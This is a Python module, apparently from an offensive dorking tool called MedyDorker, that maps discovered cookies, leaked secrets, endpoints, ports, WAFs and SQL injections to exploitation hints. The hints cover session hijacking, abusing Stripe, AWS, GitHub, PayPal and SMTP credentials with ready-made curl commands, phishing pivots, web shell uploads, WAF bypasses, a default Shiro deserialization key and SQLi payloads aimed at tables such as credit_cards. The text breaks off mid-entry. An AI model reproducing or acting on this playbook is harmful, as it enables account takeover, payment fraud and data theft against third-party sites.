"""
MedyDorker v3.15 — Actionable Hint Engine

Generates contextual next-step hints for every type of finding:
  - Cookies: vendor identification, session hijack tips, cookie editor usage
  - Secrets: what tool to use, how to exploit, risk context
  - Endpoints: what to test, common vulns per endpoint type
  - SQLi: exploitation path, dump strategy
  - WAF/Protection: bypass suggestions
  - Ports: service-specific attack vectors
  - Keys: what the key unlocks, how to abuse it
"""

from typing import Dict, List, Optional, Tuple
import re


# ═══════════════════════════════════════════════════════════════
#  COOKIE KNOWLEDGE BASE
# ═══════════════════════════════════════════════════════════════

COOKIE_VENDOR_DB: Dict[str, Dict] = {
    # ── Session Cookies ──
    "jsessionid": {
        "vendor": "Java/Tomcat/Spring",
        "type": "Session",
        "hint": "Java servlet session cookie. Use a cookie editor (EditThisCookie / Cookie-Editor) "
                "to import this session into your browser and hijack the active session. "
                "Check for session fixation — try setting your own JSESSIONID before auth.",
        "tools": ["EditThisCookie", "Cookie-Editor", "Burp Suite Cookie Jar"],
    },
    "phpsessid": {
        "vendor": "PHP",
        "type": "Session",
        "hint": "PHP session cookie. Import into browser with a cookie editor to assume this session. "
                "Test for session fixation by pre-setting the value before login. "
                "Check /tmp or session storage path for session files if you have path traversal.",
        "tools": ["EditThisCookie", "Cookie-Editor", "Burp Repeater"],
    },
    "asp.net_sessionid": {
        "vendor": "ASP.NET / IIS",
        "type": "Session",
        "hint": "ASP.NET session cookie. Paste into browser cookie editor to hijack. "
                "Check for ViewState deserialization vulns alongside this. "
                "Machine key leak = full session forge.",
        "tools": ["EditThisCookie", "ysoserial.net", "Burp ViewState Editor"],
    },
    "connect.sid": {
        "vendor": "Express.js / Node.js",
        "type": "Session",
        "hint": "Express session cookie (express-session). Import to hijack. "
                "Often signed with a weak secret — try brute-forcing the signing key with "
                "cookie-monster or flask-unsign (concept applies). "
                "Check if HttpOnly/Secure flags are missing.",
        "tools": ["EditThisCookie", "cookie-monster", "jwt_tool"],
    },
    "session": {
        "vendor": "Flask / Django / Generic",
        "type": "Session",
        "hint": "Generic session cookie. If Flask, try 'flask-unsign' to decode and forge — "
                "Flask sessions are signed, not encrypted. Django sessions use server-side storage — "
                "the cookie is just a key lookup.",
        "tools": ["flask-unsign", "EditThisCookie", "Burp Suite"],
    },
    "laravel_session": {
        "vendor": "Laravel (PHP)",
        "type": "Session",
        "hint": "Laravel session cookie. Encrypted with APP_KEY. If APP_KEY is leaked "
                "(check .env, debug page, git history), you can forge arbitrary sessions. "
                "Try triggering debug mode: /?debug=true or force 500 errors.",
        "tools": ["EditThisCookie", "laravel-exploit-CVE-2018-15133"],
    },
    "rack.session": {
        "vendor": "Ruby on Rails / Rack",
        "type": "Session",
        "hint": "Ruby Rack session. If Rails, the session may be Marshal-serialized. "
                "Leaked secret_key_base = full session forge + RCE via deserialization.",
        "tools": ["EditThisCookie", "rails-secret-decryptor"],
    },
    "_csrf_token": {
        "vendor": "Rails / Generic",
        "type": "CSRF Protection",
        "hint": "CSRF protection token. Extract and include in POST requests to bypass CSRF checks. "
                "Some apps accept the token via X-CSRF-Token header too.",
        "tools": ["Burp Suite CSRF PoC Generator"],
    },

    # ── Auth / Token Cookies ──
    "atlassian.xsrf.token": {
        "vendor": "Atlassian (Jira / Confluence / Bitbucket)",
        "type": "CSRF Token",
        "hint": "Atlassian XSRF protection token. Required for all state-changing API calls. "
                "Include as 'X-Atlassian-Token: no-check' header OR pass the cookie value "
                "in POST body as 'atl_token'. REST API: /rest/api/2/ accepts this token. "
                "If you have JSESSIONID + this token, you have full authenticated API access.",
        "tools": ["Burp Suite", "curl with -b flag", "Postman"],
    },
    "jwt": {
        "vendor": "Generic JWT Auth",
        "type": "Auth Token",
        "hint": "JSON Web Token. Decode at jwt.io to see claims (user, role, exp). "
                "Try: 1) alg=none attack, 2) HS256 key brute-force with jwt_tool, "
                "3) RS256→HS256 confusion, 4) Check 'kid' header for path traversal/SQLi.",
        "tools": ["jwt.io", "jwt_tool", "John the Ripper (jwt2john)"],
    },
    "access_token": {
        "vendor": "OAuth / Generic",
        "type": "Auth Token",
        "hint": "OAuth access token in cookie. May grant API access to user's account. "
                "Try using it directly in Authorization: Bearer header against the API.",
        "tools": ["Postman", "Burp Suite", "curl"],
    },
    "remember_me": {
        "vendor": "Generic Remember Me",
        "type": "Persistent Auth",
        "hint": "'Remember me' cookie — often a signed token or encrypted user ID. "
                "Try decoding (base64), look for predictable patterns. "
                "If the app uses Java, check for RememberMe deserialization (Shiro CVE-2016-4437).",
        "tools": ["CyberChef", "ysoserial", "Burp Decoder"],
    },
    "rememberme": {
        "vendor": "Apache Shiro",
        "type": "Persistent Auth",
        "hint": "⚠️ Apache Shiro RememberMe cookie. HIGH PRIORITY — "
                "test for CVE-2016-4437 (Shiro deserialization RCE). Default key: kPH+bIxk5D2deZiIxcaaaA==. "
                "Use ShiroExploit or ysoserial to test for code execution.",
        "tools": ["ShiroExploit", "ysoserial", "Shiro-Detector"],
    },

    # ── B3 / Tracing Cookies ──
    "x-b3-traceid": {
        "vendor": "Zipkin / Jaeger / Spring Cloud Sleuth",
        "type": "B3 Tracing",
        "hint": "🔵 B3 distributed tracing header/cookie. Reveals backend microservice architecture. "
                "The trace ID can be used to correlate requests across services. "
                "Try injecting custom trace IDs to track request flow through backend services. "
                "Look for /zipkin, /jaeger, or /actuator/trace endpoints for trace UI.",
        "tools": ["Burp Suite", "Browser DevTools Network tab"],
    },
    "x-b3-spanid": {
        "vendor": "Zipkin / Jaeger / Spring Cloud Sleuth",
        "type": "B3 Tracing",
        "hint": "🔵 B3 span ID — identifies this specific service call in the trace. "
                "Multiple spans = multiple backend services touched. "
                "Try /actuator/httptrace or /actuator/metrics for service internals.",
        "tools": ["Burp Suite"],
    },

    # ── Vendor-Specific ──
    "_shopify_y": {
        "vendor": "Shopify",
        "type": "Tracking",
        "hint": "Shopify store detected! Check /admin, try /cart.json, /products.json, "
                "/collections.json for public API data leaks. "
                "Test Shopify GraphQL at /admin/api/2024-01/graphql.json.",
        "tools": ["Shopify GraphQL Explorer", "Burp Suite"],
    },
    "wp-settings": {
        "vendor": "WordPress",
        "type": "Preference",
        "hint": "WordPress detected. Try /wp-json/wp/v2/users for user enumeration, "
                "/wp-login.php for brute force, /xmlrpc.php for amplification attacks, "
                "/wp-content/debug.log for debug info leaks.",
        "tools": ["WPScan", "xmlrpc-brute", "Burp Suite"],
    },
    "wordpress_logged_in": {
        "vendor": "WordPress",
        "type": "Auth Session",
        "hint": "⚠️ WordPress authenticated session cookie! Import into browser to hijack. "
                "The value contains the username (before the first |). "
                "If admin, access /wp-admin for full site takeover.",
        "tools": ["EditThisCookie", "WPScan"],
    },
    "magento": {
        "vendor": "Magento",
        "type": "E-commerce Session",
        "hint": "Magento store. Check /admin, /downloader, /magento_version. "
                "Test for Magento Shoplift vulnerability. Check /rest/V1/ API endpoints.",
        "tools": ["magescan", "Burp Suite"],
    },
    "prestashop": {
        "vendor": "PrestaShop",
        "type": "E-commerce Session",
        "hint": "PrestaShop detected. Check /admin*/ for admin panel, test /api/ endpoint. "
                "Look for webservice key leaks in JS files.",
        "tools": ["Burp Suite"],
    },
    "csrftoken": {
        "vendor": "Django",
        "type": "CSRF Token",
        "hint": "Django CSRF token. Include in POST as 'csrfmiddlewaretoken' or "
                "X-CSRFToken header. Django admin is at /admin/ — try default creds.",
        "tools": ["Burp Suite", "EditThisCookie"],
    },

    # ── Cloud / CDN / Security ──
    "__cf_bm": {
        "vendor": "Cloudflare Bot Management",
        "type": "Bot Detection",
        "hint": "Cloudflare bot management cookie. Site uses CF bot protection. "
                "May need to solve CF challenge. Use cloudscraper or FlareSolverr to bypass.",
        "tools": ["cloudscraper", "FlareSolverr", "cURL + browser cookies"],
    },
    "cf_clearance": {
        "vendor": "Cloudflare",
        "type": "Challenge Passed",
        "hint": "Cloudflare challenge clearance cookie. Importing this + __cf_bm into your "
                "requests will bypass Cloudflare for ~30 minutes. Time-sensitive!",
        "tools": ["EditThisCookie", "cloudscraper"],
    },
    "_gid": {
        "vendor": "Google Analytics",
        "type": "Tracking",
        "hint": "Google Analytics cookie. Site uses GA — check for Google Tag Manager "
                "misconfigurations that could allow XSS via GTM container injection.",
        "tools": ["Browser DevTools"],
    },
    "incap_ses": {
        "vendor": "Imperva/Incapsula WAF",
        "type": "WAF Session",
        "hint": "Imperva/Incapsula WAF detected. Requests without this cookie may be blocked. "
                "Copy full cookie set to bypass WAF session tracking.",
        "tools": ["Burp Suite Cookie Jar"],
    },
    "akamai_generated": {
        "vendor": "Akamai CDN",
        "type": "CDN Session",
        "hint": "Akamai CDN session cookie. Site is behind Akamai — "
                "look for origin IP leak in DNS history, error pages, or X-Forwarded-For headers.",
        "tools": ["SecurityTrails", "Shodan"],
    },
}

# Pattern-based cookie detection (regex → hint)
COOKIE_PATTERN_DB: List[Tuple[str, Dict]] = [
    (r"^AWSALB", {
        "vendor": "AWS ALB (Application Load Balancer)",
        "type": "Load Balancer",
        "hint": "AWS ALB sticky session cookie. Reveals AWS infrastructure. "
                "Try accessing the ALB domain directly to find the origin. "
                "Check for /server-status, /healthcheck, or custom health endpoints.",
    }),
    (r"^AWSALBCORS", {
        "vendor": "AWS ALB (CORS-enabled)",
        "type": "Load Balancer",
        "hint": "AWS ALB with CORS. Same as AWSALB but with SameSite=None. "
                "This means cross-site requests will carry this cookie — test CORS misconfig.",
    }),
    (r"^_ga", {
        "vendor": "Google Analytics",
        "type": "Tracking",
        "hint": "Google Analytics cookie. Contains a client ID that tracks the user. "
                "Not security-relevant unless combined with other user data.",
    }),
    (r"^_fbp", {
        "vendor": "Facebook Pixel",
        "type": "Tracking",
        "hint": "Facebook tracking pixel cookie. Indicates marketing integration. "
                "Check for Meta/Facebook API keys or pixels leaking user data.",
    }),
    (r"^ajs_", {
        "vendor": "Segment Analytics",
        "type": "Tracking",
        "hint": "Segment.io analytics cookie. Check for Segment write key in page source — "
                "leaked keys can be abused to inject fake analytics events.",
    }),
    (r"^__stripe_", {
        "vendor": "Stripe",
        "type": "Payment",
        "hint": "💳 Stripe payment cookie! Site processes payments via Stripe. "
                "Look for Stripe publishable key (pk_live_) in page source. "
                "If a Stripe secret key (sk_live_) is found, that's CRITICAL — full payment API access.",
    }),
    (r"^_dd_s", {
        "vendor": "Datadog RUM",
        "type": "Monitoring",
        "hint": "Datadog Real User Monitoring. Site uses Datadog — "
                "check for Datadog API keys or client tokens in JS source.",
    }),
    (r"^mp_", {
        "vendor": "Mixpanel",
        "type": "Analytics",
        "hint": "Mixpanel analytics cookie. Look for Mixpanel project token in page source.",
    }),
    (r"^intercom-", {
        "vendor": "Intercom",
        "type": "Chat/Support",
        "hint": "Intercom chat widget cookie. Check for Intercom app_id in source. "
                "Intercom API with leaked app_id can reveal customer data.",
    }),
    (r"^_zendesk_", {
        "vendor": "Zendesk",
        "type": "Support",
        "hint": "Zendesk support platform. Try /access/jwt for JWT auth endpoint, "
                "or /api/v2/ for REST API access.",
    }),
    (r"^hubspotutk", {
        "vendor": "HubSpot",
        "type": "Marketing/CRM",
        "hint": "HubSpot CRM tracking cookie. Contains a visitor ID that links to CRM contact. "
                "HubSpot API with leaked key can reveal full CRM contacts and deals.",
    }),
    (r"^_lr_", {
        "vendor": "LogRocket",
        "type": "Session Replay",
        "hint": "LogRocket session replay cookie. The site records user sessions. "
                "Leaked LogRocket API key could expose recorded PII and credentials typed by users.",
    }),
    (r"^__hstc", {
        "vendor": "HubSpot",
        "type": "Marketing",
        "hint": "HubSpot tracking cookie. Check page source for HubSpot portal ID.",
    }),
    (r"^OptanonConsent", {
        "vendor": "OneTrust (GDPR/Cookie Consent)",
        "type": "Privacy",
        "hint": "OneTrust GDPR consent banner. Not directly exploitable, but indicates "
                "the site handles EU user data — GDPR compliance surface.",
    }),
    (r"^ARRAffinity", {
        "vendor": "Azure App Service",
        "type": "Load Balancer",
        "hint": "Azure App Service affinity cookie. Site runs on Azure. "
                "Check for /.auth/me endpoint, /admin, or Kudu SCM at .scm.azurewebsites.net.",
    }),
    (r"^GCLB$", {
        "vendor": "Google Cloud Load Balancer",
        "type": "Load Balancer",
        "hint": "Google Cloud HTTP Load Balancer cookie. Site on GCP. "
                "Try /server-info or check for GCS bucket name leaks.",
    }),
    (r"^SERVERID", {
        "vendor": "HAProxy",
        "type": "Load Balancer",
        "hint": "HAProxy server affinity cookie. The value may reveal internal server hostname/IP. "
                "Decode the value (often base64 or hex-encoded internal IP).",
    }),
    (r"^BIGipServer", {
        "vendor": "F5 BIG-IP",
        "type": "Load Balancer",
        "hint": "⚠️ F5 BIG-IP cookie! The value encodes the internal server IP and port. "
                "Decode: reverse the hex pairs → decimal IP. "
                "Tool: https://github.com/ezelf/f5_bigip_cookie_decoder "
                "This reveals real backend IPs behind the load balancer.",
    }),
]


# ═══════════════════════════════════════════════════════════════
#  SECRET KNOWLEDGE BASE
# ═══════════════════════════════════════════════════════════════

SECRET_HINT_DB: Dict[str, Dict] = {
    # ── Database Connections ──
    "mysql_connection": {
        "hint": "🗄️ MySQL connection string found! Extract host, port, database name, and credentials. "
                "Try connecting directly: mysql -h &lt;host&gt; -P &lt;port&gt; -u &lt;user&gt; -p &lt;db&gt;. "
                "If internal hostname (e.g., mysql2:3306), this reveals internal network layout. "
                "The 'jiradb' database name suggests Jira — dump the cwd_user table for credentials.",
        "severity": "CRITICAL",
        "tools": ["mysql CLI", "DBeaver", "HeidiSQL"],
    },
    "jdbc_connection": {
        "hint": "🗄️ JDBC connection string — used by Java apps (Spring Boot, Jira, Confluence). "
                "Extract the host:port/database. If parameters like useSSL=false are present, "
                "the connection may be unencrypted. Try direct database connection with extracted creds.",
        "severity": "CRITICAL",
        "tools": ["DBeaver", "mysql CLI", "pgAdmin"],
    },
    "mongodb_connection": {
        "hint": "🗄️ MongoDB connection URI! Extract host, credentials, and database name. "
                "Try: mongosh 'mongodb://user:pass@host/db'. "
                "Check for public-facing MongoDB (default port 27017). "
                "Common data: users collection, sessions, application secrets.",
        "severity": "CRITICAL",
        "tools": ["mongosh", "MongoDB Compass", "NoSQLMap"],
    },
    "postgresql_connection": {
        "hint": "🗄️ PostgreSQL connection string. Connect with: psql 'postgresql://...' "
                "Check for superuser access. PostgreSQL COPY command can read server files. "
                "Try: COPY pg_largeobject TO '/tmp/test' for file write capability.",
        "severity": "CRITICAL",
        "tools": ["psql", "pgAdmin", "DBeaver"],
    },
    "redis_connection": {
        "hint": "🗄️ Redis connection URL! If no auth or weak password, try redis-cli -h &lt;host&gt;. "
                "Redis can be leveraged for RCE via crontab write or SSH key injection. "
                "Check for session data: KEYS * → GET session:*",
        "severity": "HIGH",
        "tools": ["redis-cli", "redis-dump"],
    },
    "connection_string": {
        "hint": "🗄️ Database connection string found. Extract credentials and connection details. "
                "Try connecting directly to the database to verify access.",
        "severity": "HIGH",
        "tools": ["DBeaver", "database-specific CLI"],
    },

    # ── Email / SMTP ──
    "email_password": {
        "hint": "📧 Email + password combination found. Could be: SMTP creds for email sending, "
                "a user login, or config credentials. Try credential stuffing against the app's login. "
                "If SMTP creds, you can send emails as this address (phishing pivot).",
        "severity": "HIGH",
        "tools": ["swaks (SMTP test)", "Hydra", "Burp Intruder"],
    },
    "smtp_credentials": {
        "hint": "📧 SMTP credentials! Connect to the mail server and test sending. "
                "Compromised SMTP = phishing emails from legitimate domain. "
                "Tool: swaks --to test@test.com --from {addr} --server {smtp} --au {user} --ap {pass}",
        "severity": "HIGH",
        "tools": ["swaks", "thunderbird", "Burp Collaborator"],
    },

    # ── API Keys ──
    "stripe_publishable": {
        "hint": "💳 Stripe publishable key (pk_live_). This is semi-public but confirms Stripe integration. "
                "Search the same codebase for the matching SECRET key (sk_live_). "
                "The publishable key can create payment tokens — minimal risk alone.",
        "severity": "LOW",
        "tools": ["Burp Suite (search for sk_live_)"],
    },
    "stripe_secret": {
        "hint": "💳 CRITICAL: Stripe SECRET key (sk_live_)! Full payment API access. "
                "Can: list all customers, view card info, issue refunds, create charges. "
                "Validate: curl https://api.stripe.com/v1/charges -u sk_live_xxx:",
        "severity": "CRITICAL",
        "tools": ["curl", "Stripe CLI", "Stripe Dashboard"],
    },
    "aws_access_key": {
        "hint": "☁️ AWS Access Key ID found! Search for the matching secret key nearby. "
                "With both keys: aws sts get-caller-identity to see who you are. "
                "Then: aws s3 ls to check S3 access. Try IAM enumeration for privilege escalation.",
        "severity": "CRITICAL",
        "tools": ["aws CLI", "Pacu (AWS exploitation)", "ScoutSuite"],
    },
    "aws_secret_key": {
        "hint": "☁️ CRITICAL: AWS Secret Access Key! Combined with Access Key ID, this grants "
                "full API access. Immediately test: export AWS_ACCESS_KEY_ID=... && "
                "export AWS_SECRET_ACCESS_KEY=... && aws sts get-caller-identity",
        "severity": "CRITICAL",
        "tools": ["aws CLI", "Pacu", "enumerate-iam"],
    },
    "google_api_key": {
        "hint": "🔑 Google API key. Test what APIs it has access to: "
                "Maps, Places, Geocoding, Custom Search, YouTube, etc. "
                "Unrestricted keys can rack up billing. Try: "
                "curl 'https://maps.googleapis.com/maps/api/geocode/json?address=test&key=KEY'",
        "severity": "MEDIUM",
        "tools": ["gmapapiscanner", "curl"],
    },
    "firebase_config": {
        "hint": "🔥 Firebase configuration found. Check for open Firestore/Realtime DB rules: "
                "https://{project}.firebaseio.com/.json — if accessible, full DB read. "
                "Check Storage: https://firebasestorage.googleapis.com/v0/b/{bucket}/o",
        "severity": "HIGH",
        "tools": ["Firebaseexplorer", "curl"],
    },
    "telegram_bot_token": {
        "hint": "🤖 Telegram Bot token. Validate: curl https://api.telegram.org/bot{TOKEN}/getMe. "
                "Can read messages, send messages, access group chats. "
                "Check /getUpdates for message history.",
        "severity": "HIGH",
        "tools": ["curl", "Telegram Bot API"],
    },
    "slack_token": {
        "hint": "💬 Slack token found. Test with: curl -H 'Authorization: Bearer xoxb-...' "
                "https://slack.com/api/auth.test — reveals workspace and user info. "
                "Try /conversations.list for channel access, /files.list for shared files.",
        "severity": "HIGH",
        "tools": ["curl", "slackpirate"],
    },
    "github_token": {
        "hint": "🐙 GitHub token! Test: curl -H 'Authorization: token ghp_xxx' "
                "https://api.github.com/user — reveals the account. "
                "Check /user/repos for private repository access. "
                "With write access: code injection via commits.",
        "severity": "CRITICAL",
        "tools": ["curl", "gh CLI", "trufflehog"],
    },
    "private_key": {
        "hint": "🔐 Private key found (RSA/EC/Ed25519)! This could be TLS cert key, SSH key, "
                "JWT signing key, or code signing key. "
                "SSH: ssh -i key.pem user@host. "
                "JWT: Use to forge tokens with jwt_tool.",
        "severity": "CRITICAL",
        "tools": ["ssh", "jwt_tool", "openssl"],
    },
    "sendgrid_api": {
        "hint": "📧 SendGrid API key. Full email sending capability. "
                "curl -X POST https://api.sendgrid.com/v3/mail/send -H 'Authorization: Bearer SG.xxx' "
                "-H 'Content-Type: application/json'",
        "severity": "HIGH",
        "tools": ["curl", "SendGrid API docs"],
    },
    "twilio_auth": {
        "hint": "📱 Twilio auth token. Can send SMS, make calls, read messages. "
                "curl -u ACCOUNT_SID:AUTH_TOKEN https://api.twilio.com/2010-04-01/Accounts",
        "severity": "HIGH",
        "tools": ["curl", "twilio CLI"],
    },
    "mailgun_api": {
        "hint": "📧 Mailgun API key. Send emails from verified domains. "
                "curl -s --user 'api:key-xxx' https://api.mailgun.net/v3/domains",
        "severity": "HIGH",
        "tools": ["curl"],
    },
    "openai_api": {
        "hint": "🤖 OpenAI API key. Can make GPT/DALL-E/Whisper API calls on the owner's account. "
                "curl https://api.openai.com/v1/models -H 'Authorization: Bearer sk-xxx' "
                "Billing abuse potential.",
        "severity": "MEDIUM",
        "tools": ["curl", "OpenAI API"],
    },
    "azure_storage": {
        "hint": "☁️ Azure Storage connection string. May grant access to Blob containers, "
                "Queues, Tables, or File shares. Use Azure Storage Explorer to browse.",
        "severity": "HIGH",
        "tools": ["Azure Storage Explorer", "az CLI"],
    },
    "paypal_credentials": {
        "hint": "💳 PayPal API credentials! Test against sandbox first then live. "
                "curl -v https://api.paypal.com/v1/oauth2/token -H 'Accept: application/json' "
                "-u 'CLIENT_ID:SECRET' -d 'grant_type=client_credentials'",
        "severity": "CRITICAL",
        "tools": ["curl", "Postman"],
    },
    "square_access_token": {
        "hint": "💳 Square payment token. Access payments, customers, inventory via Square API. "
                "curl https://connect.squareup.com/v2/locations -H 'Authorization: Bearer xxx'",
        "severity": "CRITICAL",
        "tools": ["curl", "Square API Explorer"],
    },
    "braintree_credentials": {
        "hint": "💳 Braintree (PayPal) gateway credentials. Can process transactions.",
        "severity": "CRITICAL",
        "tools": ["Braintree SDK"],
    },
}


# ═══════════════════════════════════════════════════════════════
#  ENDPOINT HINTS
# ═══════════════════════════════════════════════════════════════

ENDPOINT_HINTS: Dict[str, str] = {
    "login_pages": (
        "🔐 Login pages found. Try: 1) Default creds (admin:admin, admin:password), "
        "2) SQL injection in login form ('OR 1=1--), "
        "3) Brute force with Hydra/Burp Intruder, "
        "4) Check for user enumeration via different error messages."
    ),
    "admin_pages": (
        "👤 Admin panel detected! Try: 1) Default vendor credentials, "
        "2) Authentication bypass (add /;admin/ or ..;/ path traversal for Tomcat), "
        "3) Check if accessible without auth via direct URL, "
        "4) Look for setup/install wizards at /install or /setup."
    ),
    "file_upload": (
        "📤 File upload endpoint! Test: 1) Upload a .php/.jsp/.aspx web shell, "
        "2) Double extensions (shell.php.jpg), 3) MIME type bypass (Content-Type: image/jpeg), "
        "4) Null byte injection (shell.php%00.jpg), "
        "5) Check the upload directory for direct file access."
    ),
    "rest_api": (
        "🔗 REST API endpoints found. Test: 1) Try without auth, "
        "2) Check /api/docs, /swagger.json, /openapi.json for API docs, "
        "3) Test IDOR by changing resource IDs, "
        "4) Try method tampering (GET→PUT/DELETE)."
    ),
    "ajax_endpoints": (
        "⚡ AJAX endpoints detected. These often have weaker auth than page endpoints. "
        "Test: 1) Direct access without session, "
        "2) Parameter tampering, 3) Mass assignment (add extra JSON fields), "
        "4) Check for verbose error responses."
    ),
    "search_endpoints": (
        "🔎 Search endpoint. Test: 1) SQL injection in search query, "
        "2) XSS via search term reflection, "
        "3) LDAP injection if corporate directory search, "
        "4) Server-side template injection (SSTI) via {{7*7}}."
    ),
    "form_actions": (
        "📝 Form actions detected. Each form is a potential input vector. "
        "Test: 1) SQLi/XSS in every field, 2) File upload if present, "
        "3) CSRF — can the form be submitted from another site?, "
        "4) Hidden fields — modify with Burp before submitting."
    ),
    "interesting_js": (
        "📜 Interesting JavaScript files! JS files often leak: "
        "API keys, internal endpoints, commented-out code, debug flags. "
        "Tools: LinkFinder, JSparser, or manual regex for URLs/secrets."
    ),
    "api_calls": (
        "🌍 External API calls detected. Check: 1) Are API keys embedded in requests?, "
        "2) Can you redirect the callback URL?, 3) SSRF via URL parameter manipulation."
    ),
    "param_urls": (
        "❓ Parameterized URLs — every parameter is a potential injection point. "
        "Test each for: SQLi, XSS, path traversal (../../etc/passwd), "
        "SSRF, open redirect, and command injection."
    ),
}


# ═══════════════════════════════════════════════════════════════
#  WAF / PROTECTION HINTS
# ═══════════════════════════════════════════════════════════════

WAF_BYPASS_HINTS: Dict[str, str] = {
    "cloudflare": (
        "☁️ Cloudflare WAF detected. Bypass tips: "
        "1) Find origin IP via DNS history (SecurityTrails, Censys), "
        "2) Check mail headers (MX records → origin), "
        "3) Use cloudscraper or FlareSolverr, "
        "4) Check for IP leak in /cdn-cgi/ headers."
    ),
    "akamai": (
        "🔒 Akamai WAF. Bypass: 1) Find origin via Shodan/Censys, "
        "2) Use unicode encoding in payloads, "
        "3) Try chunked transfer encoding bypass."
    ),
    "imperva": (
        "🔒 Imperva/Incapsula WAF. Bypass: "
        "1) DNS history for origin IP, "
        "2) Try HPP (HTTP Parameter Pollution), "
        "3) Payload encoding tricks (double URL encoding)."
    ),
    "aws_waf": (
        "☁️ AWS WAF detected. Check: 1) Origin ALB/EC2 may be directly accessible, "
        "2) Try region-specific endpoints, "
        "3) Case variation in SQL keywords (SeLeCt, uNiOn)."
    ),
    "shape_security": (
        "🔒 Shape Security (now F5) — heavy bot protection. "
        "Requires real browser. Use Playwright/Puppeteer with stealth plugin."
    ),
    "sucuri": (
        "🔒 Sucuri WAF. Origin often discoverable via DNS records. "
        "Check AAAA records, MX records."
    ),
    "mod_security": (
        "🔒 ModSecurity (open-source WAF). Common bypasses: "
        "1) Encoding tricks, 2) Comments in SQL (SEL/**/ECT), "
        "3) Alternative SQL syntax."
    ),
}

CMS_HINTS: Dict[str, str] = {
    "wordpress": (
        "📦 WordPress CMS. Quick checks: "
        "/wp-json/wp/v2/users (user enum), "
        "/xmlrpc.php (brute force), /wp-content/debug.log (info leak), "
        "/wp-config.php.bak or /wp-config.php~ (backup leak). "
        "Run: wpscan --url {target} --enumerate u,p,t"
    ),
    "drupal": (
        "📦 Drupal CMS. Check: /CHANGELOG.txt for version, "
        "/user/register for user enum, /admin for panel access. "
        "Test for Drupalgeddon (CVE-2018-7600, CVE-2019-6340). "
        "Run: droopescan scan drupal -u {target}"
    ),
    "joomla": (
        "📦 Joomla CMS. Check: /administrator for admin panel, "
        "/configuration.php.bak for config leak. "
        "Run: joomscan -u {target}"
    ),
    "magento": (
        "📦 Magento E-commerce. Check /admin, /downloader, "
        "/magento_version, /skin/adminhtml. Run: magescan scan:all {target}"
    ),
    "confluence": (
        "📦 Atlassian Confluence. Check for CVE-2023-22515 (auth bypass), "
        "CVE-2022-26134 (OGNL injection RCE). "
        "REST API: /rest/api/content for page listing."
    ),
    "jira": (
        "📦 Atlassian Jira detected! Check: "
        "/rest/api/2/serverInfo (version info), "
        "/rest/api/2/myself (current user), "
        "/rest/api/2/user/search?query= (user enum), "
        "/servicedesk/customer/portals (public portals). "
        "Test for CVE-2019-8449, CVE-2019-11581 (SSTI / SSRF)."
    ),
    "gitlab": (
        "📦 GitLab detected. Check: /explore for public repos, "
        "/api/v4/ for API, /-/graphql-explorer for GraphQL. "
        "Test registration and look for CI/CD secret leaks."
    ),
    "grafana": (
        "📦 Grafana detected. Try: /api/snapshots (data leak), "
        "/api/dashboards/home (dashboard), default creds admin:admin. "
        "Check for CVE-2021-43798 (path traversal to read /etc/passwd)."
    ),
}


# ═══════════════════════════════════════════════════════════════
#  PORT HINTS
# ═══════════════════════════════════════════════════════════════

PORT_HINTS: Dict[int, str] = {
    21: "📂 FTP — try anonymous login: ftp {host}, user: anonymous, pass: (empty). Check for dir listings.",
    22: "🔑 SSH — try default creds, leaked keys. Banner reveals OS/version for CVE lookup.",
    25: "📧 SMTP — test open relay: swaks --to test@test.com --from test@{domain} --server {host}",
    53: "🌐 DNS — try zone transfer: dig axfr @{host} {domain}. May reveal internal hostnames.",
    80: "🌐 HTTP — web server. Check server header for software/version.",
    110: "📧 POP3 — email retrieval. Test with found credentials.",
    143: "📧 IMAP — email access. Connect with thunderbird or telnet.",
    443: "🔒 HTTPS — check TLS cert for alt names (more domains!) with: openssl s_client -connect {host}:443",
    445: "⚠️ SMB — try null session: smbclient -L //{host}/ -N. Check for EternalBlue (MS17-010)!",
    1433: "🗄️ MSSQL — try sa:password, use sqsh or Impacket's mssqlclient.py",
    1521: "🗄️ Oracle DB — try default creds (sys/change_on_install). Use odat for enum.",
    2082: "📊 cPanel — web hosting panel. Try default creds or reset via WHM.",
    2083: "📊 cPanel SSL — same as 2082 but encrypted.",
    2086: "📊 WHM (Web Host Manager) — root-level hosting access. Very high value if accessible.",
    2087: "📊 WHM SSL — same as 2086 but encrypted.",
    3000: "🌐 Grafana/Dev server (Node.js, Ruby). Check /login, try admin:admin.",
    3306: "🗄️ MySQL — connect: mysql -h {host} -u root -p. Test with found connection strings.",
    3389: "🖥️ RDP — Remote Desktop. Try found creds. Check for BlueKeep (CVE-2019-0708).",
    5432: "🗄️ PostgreSQL — connect: psql -h {host} -U postgres. Check for trust auth.",
    5900: "🖥️ VNC — remote desktop. Try found passwords. VNC auth is often weak.",
    6379: "⚠️ Redis — try: redis-cli -h {host}. No auth = full access. Can lead to RCE.",
    8080: "🌐 HTTP-alt (Tomcat/Jetty/proxy). Check /manager/html for Tomcat Manager (tomcat:tomcat).",
    8443: "🔒 HTTPS-alt — alternate HTTPS. Often admin panels or API endpoints.",
    8888: "🌐 Dev server / Jupyter Notebook. If Jupyter, try without token for full code execution.",
    9200: "⚠️ Elasticsearch — try: curl http://{host}:9200/_cat/indices. No auth = full data access.",
    9090: "📊 Prometheus / Cockpit. Check /metrics for internal app metrics.",
    27017: "⚠️ MongoDB — try: mongosh mongodb://{host}. No auth = full DB access.",
}


# ═══════════════════════════════════════════════════════════════
#  SQLI HINTS
# ═══════════════════════════════════════════════════════════════

SQLI_HINTS: Dict[str, str] = {
    "union": (
        "💉 UNION SQLi confirmed! Next steps: "
        "1) /dump — let MedyDorker auto-extract tables & data, "
        "2) Manually: find version(), database(), user(), "
        "3) Enumerate information_schema for table/column names, "
        "4) Target tables: users, accounts, credit_cards, payments, sessions."
    ),
    "error": (
        "💉 Error-based SQLi! Database errors reveal data inline. "
        "1) Use extractvalue() or updatexml() for MySQL, "
        "2) cast() errors for MSSQL, 3) /dump to auto-extract. "
        "Error-based is fast — data comes in error messages."
    ),
    "boolean": (
        "💉 Boolean-based blind SQLi! Data extraction through true/false responses. "
        "Slower but reliable. /dump will use binary search to extract char-by-char. "
        "Manual: ' AND SUBSTRING(user(),1,1)='r'-- "
    ),
    "time": (
        "💉 Time-based blind SQLi — the slowest but most reliable technique. "
        "Data extracted via response delay differences. /dump handles this automatically. "
        "Manual: ' AND IF(SUBSTRING(user(),1,1)='r',SLEEP(5),0)--"
    ),
    "cookie": (
        "💉 Cookie injection found! The app uses cookie values in SQL queries. "
        "Use Burp Suite or cookie editor to inject payloads into the cookie value. "
